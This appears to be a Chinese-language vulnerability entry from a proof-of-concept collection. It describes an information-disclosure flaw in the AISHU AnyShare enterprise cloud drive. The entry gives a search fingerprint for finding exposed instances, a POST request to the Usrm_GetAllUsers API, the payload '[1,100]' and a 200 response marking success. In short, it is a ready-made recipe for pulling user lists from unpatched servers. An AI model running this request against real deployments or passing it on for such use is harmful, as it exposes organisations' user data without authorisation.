# 爱数企业云盘Usrm_GetAllUsers存在任意信息泄露漏洞

爱数企业云盘 ｜ 信息泄露 ｜ —
- **指纹**：`app="AISHU-AnyShare"`
- **请求**：`POST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1`

**Payload**
```
[1,100]
```
- **响应特征**：200